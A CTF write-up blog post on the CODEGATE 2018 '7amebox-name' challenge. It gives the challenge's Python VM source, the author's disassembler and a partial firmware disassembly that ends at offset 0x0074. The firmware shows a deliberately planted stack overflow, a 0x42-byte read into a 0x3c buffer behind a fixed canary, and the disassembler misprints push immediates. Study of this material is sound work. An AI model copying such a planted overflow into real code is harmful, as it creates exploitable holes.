---
layout: post
title: "[CODEGATE 2018] 7amebox-name"
comments: true
category: ctf
---

## before challenge

There are three challenges of 7amebox. <br />
We have to make disassembler for this challenges. <br />
There is '_7amebox_patched.py' file which of vm. <br />
And each challenges have firmware file. <br />
After make disassembler, we have to disassem these files and get flag. <br />

***

## vm

```python
#!/usr/bin/python

import random
import signal
import sys

PERM_MAPPED		= 0b1000
PERM_READ		= 0b0100
PERM_WRITE		= 0b0010
PERM_EXEC		= 0b0001

TYPE_R = 0
TYPE_I = 1

FLAG_NF = 0b0010
FLAG_ZF = 0b0001

CODE_DEFAULT_BASE   = 0x00000
STACK_DEFAULT_BASE  = 0xf4000



class Stdin:
    def read(self, size):
        res = ''
        buf = sys.stdin.readline(size)
        for ch in buf:
            if ord(ch) > 0b1111111:
                break
            if ch == '\n':
                res += ch
                break
            res += ch
        return res

    def write(self, data):
        return None


class Stdout:
    def read(self, size):
        return None

    def write(self, data):
        out = ''.join(map(chr, data))
        sys.stdout.write(out)
        sys.stdout.flush()
        return len(out)


class Register:
    def __init__(self):
        self.register = {}
        self.register_list = ['r0', 'r1', 'r2', 'r3', 'r4', 'r5', 'r6', 'r7','r8', 'r9', 'r10', 'bp', 'sp', 'pc', 'eflags', 'zero']

    def init_register(self):
        for reg_name in self.register_list:
            self.register[reg_name] = 0

    def set_register(self, reg, value):
        if isinstance(reg, (int, long)) :
            if reg < len(self.register_list):
                reg = self.register_list[reg]
            else:
                self.terminate("[VM] Invalid register")

        elif reg not in self.register:
            self.terminate("[VM] Invalid register")

        self.register[reg] = value

    def get_register(self, reg):
        if isinstance(reg, (int, long)) :
            if reg < len(self.register_list):
                reg = self.register_list[reg]
            else:
                self.terminate("[VM] Invalid register")

        elif reg not in self.register:
            self.terminate("[VM] Invalid register")

        return self.register[reg]


class FileSystem:
    def __init__(self):
        self.files = {}

    def load_file(self, filename):
        with open(filename, 'rb') as f:
            self.files[filename] = f.read()

    def open(self, filename):
        if filename in self.files:
            fd = File()
            fd.set_buffer(self.files[filename])
            return fd
        else:
            return -1


class File:
    def __init__(self):
        self.buffer = ''
        self.pos = 0
        self.size = 0

    def set_buffer(self, data):
        self.buffer = data
        self.size = len(self.buffer)

    def read(self, size):
        res = ''
        if self.pos >= self.size:
            return ''

        if self.pos + size >= len(self.buffer):
            res += self.buffer[self.pos : ]
            self.pos = len(self.buffer)
        else:
            res += self.buffer[self.pos : self.pos+size]
            self.pos += size
        return res

    def write(self, data):
        return None


class Memory:
    def __init__(self, size):
        self.memory = [0 for i in range(size)]
        self.pages = {}
        for page in range(0, size, 0x1000):
            self.pages[page] = 0

    def __getitem__(self, key):
        return self.memory[key]

    def __setitem__(self, key, val):
        self.memory[key] = val

    def get_perm(self, addr):
        if (addr & 0b111111111000000000000) not in self.pages:
            return 0
        else:
            return self.pages[addr & 0b111111111000000000000]

    def set_perm(self, addr, perm):
        self.pages[addr & 0b111111111000000000000] = perm & 0b1111

    def allocate(self, new_perm, addr=None):
        if addr:
            if not (self.get_perm(addr) & PERM_MAPPED):
                self.set_perm(addr, (PERM_MAPPED | new_perm) & 0b1111)
                return addr
            else:
                return -1

        for page, perm in self.pages.items():
            if not (self.get_perm(page) & PERM_MAPPED):
                self.set_perm(page, (PERM_MAPPED | new_perm) & 0b1111)
                return page
        return -1

    def check_permission(self, addr, perm):
        if (self.get_perm(addr) & (PERM_MAPPED | perm)) == (PERM_MAPPED | perm):
            return True
        else:
            return False


class EMU:
    def __init__(self):
        self.config     = {'NX':False}
        self.firmware   = None
        self.is_load    = False
        self.register   = Register()
        self.register.init_register()
        self.pipeline   = []
        self.memory     = Memory(2 ** 20)
        self.checkperm  = []
        self.filesystem = FileSystem()

        self.syscall_table  = [self.sys_s0, self.sys_s1,
                               self.sys_s2, self.sys_s3,
                               self.sys_s4, self.sys_s5,
                               self.sys_s6]

        self.op_hander_table = [self.op_x0, self.op_x1,
                                self.op_x2, self.op_x3,
                                self.op_x4, self.op_x5, self.op_x6,
                                self.op_x7, self.op_x8,
                                self.op_x9, self.op_x10,
                                self.op_x11, self.op_x12,
                                self.op_x13, self.op_x14,
                                self.op_x15, self.op_x16,
                                self.op_x17, self.op_x18,
                                self.op_x19, self.op_x20,
                                self.op_x21, self.op_x22,
                                self.op_x23, self.op_x24,
                                self.op_x25, self.op_x26,
                                self.op_x27, self.op_x28,
                                self.op_x29, self.op_x30]

    def set_timeout(self, timeout = 30):
        def handler(signum, frame):
            print 'timeout!'
            exit(-1)
        signal.signal(signal.SIGALRM, handler)
        signal.alarm(timeout)

    def set_mitigation(self, nx=False):
        if nx:
            self.config['NX'] = nx

    def init_pipeline(self):
        self.pipeline.append(Stdin())
        self.pipeline.append(Stdout())

    def load_firmware(self, firm_name):
        try:
            with open(firm_name, 'rb') as f:
                data = f.read()

            self.firmware = [ord(byte) for byte in data]
            self.is_load = True


            if self.config['NX']:
                stack_perm = PERM_READ | PERM_WRITE
            else:
                stack_perm = PERM_READ | PERM_WRITE | PERM_EXEC


            for i in range(0, len(data) / 0x1000 + 1):
                self.memory.allocate(PERM_READ | PERM_WRITE | PERM_EXEC, addr=CODE_DEFAULT_BASE + i*0x1000)

            self.write_memory(CODE_DEFAULT_BASE, self.firmware, len(self.firmware))

            for i in range(0, len(data) / 0x1000 + 1):
                self.memory.set_perm(CODE_DEFAULT_BASE + i*0x1000, PERM_MAPPED | PERM_READ | PERM_EXEC)


            self.memory.allocate(stack_perm, addr=STACK_DEFAULT_BASE)
            self.memory.allocate(stack_perm, addr=STACK_DEFAULT_BASE + 0x1000)

            self.register.set_register('pc', CODE_DEFAULT_BASE)
            self.register.set_register('sp', STACK_DEFAULT_BASE+0x1fe0)

        except:
            self.terminate("[VM] Firmware load error")

    def bit_concat(self, bit_list):
        res = 0
        for bit in bit_list:
            res <<= 7
            res += bit & 0b1111111
        return res


    def execute(self):
        try:
            while 1:
                cur_pc = self.register.get_register('pc')
                op, op_type, opers, op_size = self.dispatch(cur_pc)

                if not self.memory.check_permission(cur_pc, PERM_EXEC) or not self.memory.check_permission(cur_pc + op_size - 1, PERM_EXEC):
                    self.terminate("[VM] Can't exec memory")

                self.register.set_register('pc', cur_pc + op_size)
                op_handler = self.op_hander_table[op]
                op_handler(op_type, opers)
        except:
            self.terminate("[VM] Unknown error")


    def dispatch(self, addr):
        opcode = self.bit_concat(self.read_memory(addr, 2))
        op      = (opcode & 0b11111000000000) >> 9
        if op >= len(self.op_hander_table):
            self.terminate("[VM] Invalid instruction")

        op_type = (opcode & 0b00000100000000) >> 8
        opers   = []
        if op_type == TYPE_R:
            opers.append((opcode & 0b00000011110000) >> 4)
            opers.append((opcode & 0b00000000001111))
            op_size = 2

        elif op_type == TYPE_I:
            opers.append((opcode & 0b00000011110000) >> 4)
            opers.append(self.read_memory_tri(addr+2, 1)[0])
            op_size = 5

        else:
            self.terminate("[VM] Invalid instruction")

        return op, op_type, opers, op_size


    def read_memory(self, addr, length):
        if not length:
            return []

        if self.memory.check_permission(addr, PERM_READ) and self.memory.check_permission(addr + length - 1, PERM_READ):
            res = self.memory[addr : addr + length]
            return res
        else:
            self.terminate("[VM] Can't read memory")


    def read_memory_str(self, addr):
        res = []
        length = 0

        while 0 not in res:
            res.append(self.memory[addr + length])
            length += 1
        res = res[:-1]
        length -= 1

        if not length:
            return '', 0

        if self.memory.check_permission(addr, PERM_READ) and self.memory.check_permission(addr + length - 1, PERM_READ):
            return ''.join(map(chr,res)), length
        else:
            self.terminate("[VM] Can't read memory")


    def read_memory_tri(self, addr, count):
        if not count:
            return []

        if self.memory.check_permission(addr, PERM_READ) and self.memory.check_permission(addr + count*3 - 1, PERM_READ):
            res = []
            for i in range(count):
                tri = 0
                tri |= self.memory[addr + i*3]
                tri |= self.memory[addr + i*3 + 1]  << 14
                tri |= self.memory[addr + i*3 + 2]  << 7
                res.append(tri)
            return res
        else:
            self.terminate("[VM] Can't read memory")


    def write_memory(self, addr, data, length):
        if not length:
            return

        if self.memory.check_permission(addr, PERM_WRITE) and self.memory.check_permission(addr + length - 1, PERM_WRITE):
            for offset in range(length):
                self.memory[addr + offset] = data[offset] & 0b1111111
        else:
            self.terminate("[VM] Can't write memory")


    def write_memory_tri(self,addr,data_list, count):
        if not count:
            return

        if self.memory.check_permission(addr, PERM_WRITE) and self.memory.check_permission(addr + count*3 - 1, PERM_WRITE):
            for i in range(count):
                self.memory[addr + i*3] =       (data_list[i] & 0b000000000000001111111)
                self.memory[addr + i*3 + 1] =   (data_list[i] & 0b111111100000000000000) >> 14
                self.memory[addr + i*3 + 2] =   (data_list[i] & 0b000000011111110000000) >> 7
        else:
            self.terminate("[VM] Can't write memory")


    def op_x0(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = opers[0]

            data = self.read_memory_tri(src, 1)[0]
            self.register.set_register(dst, data)

        else:
            self.terminate("[VM] Invalid instruction")

    def op_x1(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = opers[0]

            ch = self.read_memory(src, 1)[0]
            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst & 0b111111111111110000000) | ch)
        else:
            self.terminate("[VM] Invalid instruction")


    def op_x2(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[0])
            dst = self.register.get_register(opers[1])
            self.write_memory_tri(dst, [src], 1)
        else:
            self.terminate("[VM] Invalid instruction")


    def op_x3(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[0])
            dst = self.register.get_register(opers[1])
            self.write_memory(dst, [src & 0b1111111], 1)
        else:
            self.terminate("[VM] Invalid instruction")


    def op_x4(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = opers[0]

            self.register.set_register(dst, src)

        elif op_type == TYPE_I:
            src = opers[1]
            dst = opers[0]

            self.register.set_register(dst, src)

        else:
            self.terminate("[VM] Invalid instruction")

    def op_x5(self, op_type, opers):
        if op_type == TYPE_R:
            src = opers[1]
            dst = opers[0]

            org_src = self.register.get_register(src)
            org_dst = self.register.get_register(dst)

            self.register.set_register(src, org_dst)
            self.register.set_register(dst, org_src)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x6(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[0])
            sp = self.register.get_register('sp')

            self.register.set_register('sp', sp-3)
            self.write_memory_tri(sp-3, [src], 1)

        elif op_type == TYPE_I:
            src = opers[1]
            sp = self.register.get_register('sp')

            self.register.set_register('sp', sp-3)
            self.write_memory_tri(sp-3, [src], 1)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x7(self, op_type, opers):
        if op_type == TYPE_R:
            dst = opers[0]
            sp = self.register.get_register('sp')

            value = self.read_memory_tri(sp, 1)[0]
            self.register.set_register(dst, value)
            self.register.set_register('sp', sp+3)

        else:
            self.terminate("[VM] Invalid instruction")

    def op_x9(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst + src) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            src = opers[1]
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst + src) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x10(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1]) & 0b1111111
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst & 0b111111111111110000000) | ((org_dst + src) & 0b1111111))

        elif op_type == TYPE_I:
            src = opers[1]
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst & 0b111111111111110000000) | ((org_dst + src) & 0b1111111))

        else:
            self.terminate("[VM] Invalid instruction")

    def op_x11(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst - src) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            src = opers[1]
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst - src) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x12(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1]) & 0b1111111
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst & 0b111111111111110000000) | ((org_dst - src) & 0b1111111))

        elif op_type == TYPE_I:
            src = opers[1]
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst & 0b111111111111110000000) | ((org_dst - src) & 0b1111111))

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x13(self, op_type, opers):
         if op_type == TYPE_R:
            dst = opers[0]
            value = self.register.get_register(opers[1])

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, org_dst >> value)

         elif op_type == TYPE_I:
            dst = opers[0]
            value = opers[1]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, org_dst >> value)
         else:
            self.terminate("[VM] Invalid instruction")


    def op_x14(self, op_type, opers):
         if op_type == TYPE_R:
            dst = opers[0]
            value = self.register.get_register(opers[1])

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst << value) & 0b111111111111111111111)

         elif op_type == TYPE_I:
            dst = opers[0]
            value = opers[1]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst << value) & 0b111111111111111111111)
         else:
            self.terminate("[VM] Invalid instruction")


    def op_x15(self, op_type, opers):
         if op_type == TYPE_R:
            dst = opers[0]
            value = self.register.get_register(opers[1])

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, ((org_dst * value) & 0b111111111111111111111))

         elif op_type == TYPE_I:
            dst = opers[0]
            value = opers[1]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, ((org_dst * value) & 0b111111111111111111111))
         else:
            self.terminate("[VM] Invalid instruction")


    def op_x16(self, op_type, opers):
         if op_type == TYPE_R:
            dst = opers[0]
            value = self.register.get_register(opers[1])

            if value == 0:
                self.terminate("[VM] Divide by zero")

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (int(org_dst / value) & 0b111111111111111111111))

         elif op_type == TYPE_I:
            dst = opers[0]
            value = opers[1]

            if value == 0:
                self.terminate("[VM] Divide by zero")

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (int(org_dst / value) & 0b111111111111111111111))
         else:
            self.terminate("[VM] Invalid instruction")


    def op_x17(self, op_type, opers):
         if op_type == TYPE_R:
            src = opers[0]
            value = self.register.get_register(src)
            value += 1

            self.register.set_register(src, value)

         else:
            self.terminate("[VM] Invalid instruction")


    def op_x18(self, op_type, opers):
         if op_type == TYPE_R:
            src = opers[0]
            value = self.register.get_register(src)
            value -= 1

            self.register.set_register(src, value)

         else:
            self.terminate("[VM] Invalid instruction")


    def op_x19(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst & src) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            src = opers[1]
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst & src) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x20(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst | src) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            src = opers[1]
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst | src) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x21(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst ^ src) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            src = opers[1]
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst ^ src) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x22(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst % src) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            src = opers[1]
            dst = opers[0]

            org_dst = self.register.get_register(dst)
            self.register.set_register(dst, (org_dst % src) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x23(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1])
            dst = self.register.get_register(opers[0])

            tmp = dst - src
            if tmp == 0:
                eflags = FLAG_ZF

            elif tmp < 0:
                eflags = FLAG_NF

            else:
                eflags = 0b0000

            self.register.set_register('eflags', eflags & 0b111111111111111111111)

        elif op_type == TYPE_I:
            src = opers[1]
            dst = self.register.get_register(opers[0])

            tmp = dst - src
            if tmp == 0:
                eflags = FLAG_ZF

            elif tmp < 0:
                eflags = FLAG_NF

            else:
                eflags = 0b0000

            self.register.set_register('eflags', eflags & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x24(self, op_type, opers):
        if op_type == TYPE_R:
            src = self.register.get_register(opers[1]) & 0b000000000000001111111
            dst = self.register.get_register(opers[0]) & 0b000000000000001111111

            tmp = dst - src
            if tmp == 0:
                eflags = FLAG_ZF

            elif tmp < 0:
                eflags = FLAG_NF

            else:
                eflags = 0b0000

            self.register.set_register('eflags', eflags & 0b111111111111111111111)

        elif op_type == TYPE_I:
            src = opers[1] & 0b000000000000001111111
            dst = self.register.get_register(opers[0]) & 0b000000000000001111111

            tmp = dst - src
            if tmp == 0:
                eflags = FLAG_ZF

            elif tmp < 0:
                eflags = FLAG_NF

            else:
                eflags = 0b0000

            self.register.set_register('eflags', eflags & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x25(self, op_type, opers):
        if op_type == TYPE_R:
            eflags = self.register.get_register('eflags')
            base = self.register.get_register(opers[0])
            offset = self.register.get_register(opers[1])

            if not (eflags & FLAG_NF) and not (eflags & FLAG_ZF):
                self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            eflags = self.register.get_register('eflags')
            base = self.register.get_register(opers[0])
            offset = opers[1]

            if not (eflags & FLAG_NF) and not (eflags & FLAG_ZF):
                self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x26(self, op_type, opers):
        if op_type == TYPE_R:
            eflags = self.register.get_register('eflags')
            base = self.register.get_register(opers[0])
            offset = self.register.get_register(opers[1])

            if (eflags & FLAG_NF) and not (eflags & FLAG_ZF):
                self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            eflags = self.register.get_register('eflags')
            base = self.register.get_register(opers[0])
            offset = opers[1]

            if (eflags & FLAG_NF) and not (eflags & FLAG_ZF):
                self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x27(self, op_type, opers):
        if op_type == TYPE_R:
            eflags = self.register.get_register('eflags')
            base = self.register.get_register(opers[0])
            offset = self.register.get_register(opers[1])

            if (eflags & FLAG_ZF):
                self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            eflags = self.register.get_register('eflags')
            base = self.register.get_register(opers[0])
            offset = opers[1]

            if (eflags & FLAG_ZF):
                self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")

    def op_x28(self, op_type, opers):
        if op_type == TYPE_R:
            eflags = self.register.get_register('eflags')
            base = self.register.get_register(opers[0])
            offset = self.register.get_register(opers[1])

            if not (eflags & FLAG_ZF):
                self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            eflags = self.register.get_register('eflags')
            base = self.register.get_register(opers[0])
            offset = opers[1]

            if not (eflags & FLAG_ZF):
                self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")



    def op_x29(self, op_type, opers):
        if op_type == TYPE_R:
            base = self.register.get_register(opers[0])
            offset = self.register.get_register(opers[1])

            self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            base = self.register.get_register(opers[0])
            offset = opers[1]

            self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x30(self, op_type, opers):
        if op_type == TYPE_R:
            base = self.register.get_register(opers[0])
            offset = self.register.get_register(opers[1])
            ret_addr = self.register.get_register('pc')

            self.op_x6(1, [0, ret_addr])
            self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        elif op_type == TYPE_I:
            base = self.register.get_register(opers[0])
            offset = opers[1]
            ret_addr = self.register.get_register('pc')

            self.op_x6(1, [0, ret_addr])
            self.register.set_register('pc', (base + offset) & 0b111111111111111111111)

        else:
            self.terminate("[VM] Invalid instruction")


    def op_x8(self, op_type, opers):
        syscall_num = self.register.get_register('r0')
        if 0 <= syscall_num < len(self.syscall_table):
            syscall = self.syscall_table[syscall_num]
            syscall()

        else:
            self.terminate("[VM] Invalid syscall")


    def sys_s0(self):
        exit(0)


    def sys_s1(self):
        filename, filename_len = self.read_memory_str(self.register.get_register('r1'))

        fd = self.filesystem.open(filename)
        if fd != -1:
            self.pipeline.append(fd)
            self.register.set_register('r0', len(self.pipeline) - 1)
        else:
            self.register.set_register('r0', 0b111111111111111111111)


    def sys_s2(self):
        fd = self.register.get_register('r1')
        buf = self.register.get_register('r2')
        size = self.register.get_register('r3')

        data = self.read_memory(buf, size)

        if 0 <= fd < len(self.pipeline):
            self.pipeline[fd].write(data)
            self.register.set_register('r0', size)
        else:
            self.register.set_register('r0', 0)


    def sys_s3(self):
        fd = self.register.get_register('r1')
        buf = self.register.get_register('r2')
        size = self.register.get_register('r3')

        if 0 <= fd < len(self.pipeline):
            data = map(ord, self.pipeline[fd].read(size))
            self.write_memory(buf, data, len(data))
            self.register.set_register('r0', len(data) & 0b111111111111111111111)
        else:
            self.register.set_register('r0', 0)


    def sys_s4(self):
        res_ptr = self.register.get_register('r1')
        perm = self.register.get_register('r2')

        addr = self.memory.allocate(perm)
        if addr != -1:
            self.write_memory_tri(res_ptr, [addr], 1)
            self.register.set_register('r0', 1)
        else:
            self.register.set_register('r0', 0)


    def sys_s5(self):
        self.register.set_register('r0', random.randrange(0, 2**21-1))


    def sys_s6(self):
        addr = self.register.get_register('r1') & 0b111111111000000000000
        self.memory.set_perm(addr, 0b0000)


    def terminate(self, msg):
        print msg
        exit(-1)
```

VM is composed of 7bit format. <br />
There are 31 op commands, 7 syscall commands, 16 registers and etc. <br />
Overall, vm is really similar to arm architecture. <br />
Data is written in memory like c - a - b. Base size is 3 bytes. <br />

***

## disassembler

This is disassembler code.

```python
import sys
import os

register = ['r0', 'r1', 'r2', 'r3', 'r4', 'r5', 'r6', 'r7','r8', 'r9', 'r10', 'bp', 'sp', 'pc', 'eflags', 'zero']

def bit_concat(bit_list):
    res = 0
    for bit in bit_list:
        res <<= 7
        res += bit & 0b1111111
    return res

def read_memory_tri(sub_file):
    tri = 0
    tri |= (sub_file & 0b1111111) << 7
    tri |= (sub_file & 0b11111110000000) << 7
    return tri
            
if len(sys.argv) < 2:
    print("Usage: 7isassembler.py <filename>")
    sys.exit(1)

file_name = sys.argv[1]

file = None
try:
    with open(file_name, 'rb') as f:
        file = f.read()

    
except Exception as e:
    print(f"Error opening file: {e}")
    sys.exit(1)

idx = 0

while idx < len(file):
    opcode = bit_concat(file[idx : idx+2])
    op = (opcode & 0b11111000000000) >> 9
    op_type = (opcode & 0b00000100000000) >> 8
    opera = None
    operb = None
    print("0x%04x" %(idx), end = ' ')
    if op_type == 0:
        opera = (opcode & 0b00000011110000) >> 4
        operb = (opcode & 0b00000000001111)
        idx += 2
    else:
        opera = (opcode & 0b00000011110000) >> 4
        operb = read_memory_tri(bit_concat(file[idx+2 : idx+5]))
        idx += 5

    print("%4d %d %4d %8d" %(op, op_type, opera, operb), end = ' ')

    if op == 0:
        print(f'mov {register[opera]}, [{register[operb]}]')
    
    elif op == 1:
        print(f'movb {register[opera]}, [{register[operb]}]')

    elif op == 2:
        print(f'mov [{register[operb]}], {register[opera]}')

    elif op == 3:
        print(f'movb [{register[operb]}], {register[opera]}')

    elif op == 4:
        if op_type == 0:
            print(f'mov {register[opera]}, {register[operb]}')
        else:
            print(f'mov {register[opera]}, {hex(operb)}')

    elif op == 5:
        print(f'xchg {register[opera]}, {register[operb]}')

    elif op == 6:
        if op_type == 0:
            print(f'push {register[opera]}')
        else:
            print(f'push {hex(opera)}')

    elif op == 7:
        print(f'pop {register[opera]}')
    
    elif op == 8:
        print(f'syscall r0')

    elif op == 9:
        if op_type == 0:
            print(f'add {register[opera]}, {register[operb]}')
        else:
            print(f'add {register[opera]}, {hex(operb)}')

    elif op == 10:
        if op_type == 0:
            print(f'addb {register[opera]}, {register[operb]}')
        else:
            print(f'addb {register[opera]}, {hex(operb)}')
    
    elif op == 11:
        if op_type == 0:
            print(f'sub {register[opera]}, {register[operb]}')
        else:
            print(f'sub {register[opera]}, {hex(operb)}')

    elif op == 12:
        if op_type == 0:
            print(f'subb {register[opera]}, {register[operb]}')
        else:
            print(f'subb {register[opera]}, {hex(operb)}')

    elif op == 13:
        if op_type == 0:
            print(f'shr {register[opera]}, {register[operb]}')
        else:
            print(f'shr {register[opera]}, {hex(operb)}')

    elif op == 14:
        if op_type == 0:
            print(f'shl {register[opera]}, {register[operb]}')
        else:
            print(f'shl {register[opera]}, {hex(operb)}')

    elif op == 15:
        if op_type == 0:
            print(f'mul {register[opera]}, {register[operb]}')
        else:
            print(f'mul {register[opera]}, {hex(operb)}')

    elif op == 16:
        if op_type == 0:
            print(f'div {register[opera]}, {register[operb]}')
        else:
            print(f'div {register[opera]}, {hex(operb)}')

    elif op == 17:
        print(f'inc {register[opera]}')

    elif op == 18:
        print(f'dec {register[opera]}')

    elif op == 19:
        if op_type == 0:
            print(f'and {register[opera]}, {register[operb]}')
        else:
            print(f'and {register[opera]}, {hex(operb)}')

    elif op == 20:
        if op_type == 0:
            print(f'or {register[opera]}, {register[operb]}')
        else:
            print(f'or {register[opera]}, {hex(operb)}')

    elif op == 21:
        if op_type == 0:
            print(f'xor {register[opera]}, {register[operb]}')
        else:
            print(f'xor {register[opera]}, {hex(operb)}')

    elif op == 22:
        if op_type == 0:
            print(f'mod {register[opera]}, {register[operb]}')
        else:
            print(f'mod {register[opera]}, {hex(operb)}')

    elif op == 23:
        if op_type == 0:
            print(f'cmp {register[opera]}, {register[operb]}')
        else:
            print(f'cmp {register[opera]}, {hex(operb)}')

    elif op == 24:
        if op_type == 0:
            print(f'cmpb {register[opera]}, {register[operb]}')
        else:
            print(f'cmpb {register[opera]}, {hex(operb)}')

    elif op == 25:
        if op_type == 0:
            print(f'ja [{register[opera]} + {register[operb]}]')
        else:
            print(f'ja [{register[opera]} + {hex(operb)}]')

    elif op == 26:
        if op_type == 0:
            print(f'jb [{register[opera]} + {register[operb]}]')
        else:
            print(f'jb [{register[opera]} + {hex(operb)}]')

    elif op == 27:
        if op_type == 0:
            print(f'jz [{register[opera]} + {register[operb]}]')
        else:
            print(f'jz [{register[opera]} + {hex(operb)}]')

    elif op == 28:
        if op_type == 0:
            print(f'jnz [{register[opera]} + {register[operb]}]')
        else:
            print(f'jnz [{register[opera]} + {hex(operb)}]')

    elif op == 29:
        if op_type == 0:
            print(f'jmp [{register[opera]} + {register[operb]}]')
        else:
            print(f'jmp [{register[opera]} + {hex(operb)}]')

    elif op == 30:
        if op_type == 0:
            print(f'call [{register[opera]} + {register[operb]}]')
        else:
            print(f'call [{register[opera]} + {hex(operb)}]')

```

***

## firmware

Let's disassem firmware.

```
[before main]
0x0000   30 1   13        4 call [pc + 0x4]

[exit]
0x0005   21 0    0        0 xor r0, r0
0x0007    8 0    0        0 syscall r0

[main]
0x0009    6 0   11        0 push bp
0x000b    4 0   11       12 mov bp, sp
0x000d   11 1   12       60 sub sp, 0x3c
0x0012    4 0    5       11 mov r5, bp
0x0014   11 1    5        3 sub r5, 0x3
0x0019    4 1    6    74565 mov r6, 0x12345
0x001e    2 0    6        5 mov [r5], r6
0x0020    4 1    0      205 mov r0, 0xcd
0x0025   30 1   13      102 call [pc + 0x66]
0x002a    4 1    1       66 mov r1, 0x42
0x002f    4 0    5       11 mov r5, bp
0x0031   11 1    5       60 sub r5, 0x3c
0x0036    4 0    0        5 mov r0, r5
0x0038   30 1   13       35 call [pc + 0x23]
0x003d    4 1    0      211 mov r0, 0xd3
0x0042   30 1   13       73 call [pc + 0x49]
0x0047    4 0    5       11 mov r5, bp
0x0049   11 1    5        3 sub r5, 0x3
0x004e    0 0    6        5 mov r6, [r5]
0x0050   23 1    6    74565 cmp r6, 0x12345
0x0055   28 1   13  2097067 jnz [pc + 0x1fffab]
0x005a    4 0   12       11 mov sp, bp
0x005c    7 0   11        0 pop bp
0x005e    7 0   13        0 pop pc

[stdin read syscall]
0x0060    4 0    3        1 mov r3, r1
0x0062    4 0    2        0 mov r2, r0
0x0064    4 1    1        0 mov r1, 0x0
0x0069    4 1    0        3 mov r0, 0x3
0x006e    8 0    0        0 syscall r0
0x0070    7 0   13        0 pop pc

[stdout write syscall]
0x0072    6 0    1        0 push r1
0x0074    6 0    2        0 push r2
